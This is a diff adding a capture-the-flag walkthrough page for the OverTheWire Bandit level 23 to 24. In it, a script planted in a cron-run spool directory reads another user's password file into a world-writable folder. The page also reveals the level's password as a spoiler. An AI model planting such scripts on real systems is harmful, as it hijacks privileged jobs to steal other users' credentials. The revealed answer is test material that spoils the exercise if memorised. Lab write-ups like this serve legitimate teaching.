@@ -1,0 +1,56 @@
+---
+title: Bandit 23 → 24
+description: "OverTheWire Bandit 23 to 24: drop a script into a spool directory that a cron job runs as the next user."
+sidebar:
+  label: "23 → 24"
+  order: 23
+---
+
+import Toggle from '@components/Toggle.astro';
+
+<div class="machine-meta">
+  <span class="meta-badge platform-overthewire">OverTheWire</span>
+  <span class="meta-badge os-linux">Linux</span>
+</div>
+
+> Goal: get bandit24's password from a cron job that runs every script left in its spool directory.
+
+## Approach
+
+Read the job, then plant a script that copies the password somewhere world-readable and wait for the next run.
+
+```bash frame="code" title="bandit23@bandit"
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+myname=$(whoami)
+cd /var/spool/$myname/foo
+for i in * .*; do
+    if [ "$i" != "." -a "$i" != ".." ]; then
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+bandit23@bandit:~$ mkdir -p /tmp/loot && chmod 777 /tmp/loot
+bandit23@bandit:~$ cat > /var/spool/bandit24/foo/run.sh <<'EOF'
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/loot/pw
+EOF
+bandit23@bandit:~$ chmod +x /var/spool/bandit24/foo/run.sh
+bandit23@bandit:~$ cat /tmp/loot/pw
+The password you are looking for is: <password>
+```
+
+## Why it works
+
+The job runs every script that appears in bandit24's spool directory as bandit24, and that directory is writable by you. Write access to a privileged job's input is code execution as that user: the planted script copies the password to a directory you can read. You never needed read access to bandit24's files, only the ability to make it act for you.
+
+<Toggle label="Reveal password" class="spoiler-toggle">
+
+```text frame="code"
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+</Toggle>
